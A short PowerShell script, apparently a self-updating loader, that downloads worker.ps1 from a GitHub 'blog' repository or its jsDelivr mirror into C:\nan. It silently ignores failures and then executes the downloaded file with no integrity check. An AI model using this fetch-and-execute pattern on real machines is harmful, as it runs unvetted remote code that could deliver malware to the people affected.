$ErrorActionPreference = 'Continue'
$root = 'C:\nan'
$srcs = @(
  'https://raw.githubusercontent.com/LJRNN/blog/main/nan/worker.ps1',
  'https://cdn.jsdelivr.net/gh/LJRNN/blog@main/nan/worker.ps1'
)
foreach ($u in $srcs) {
  try {
    Invoke-WebRequest -Uri ($u + '?t=' + [DateTime]::UtcNow.Ticks) -UseBasicParsing -TimeoutSec 20 -OutFile (Join-Path $root 'worker.ps1.new')
    Move-Item -Force (Join-Path $root 'worker.ps1.new') (Join-Path $root 'worker.ps1')
    break
  } catch { }
}
& (Join-Path $root 'worker.ps1')
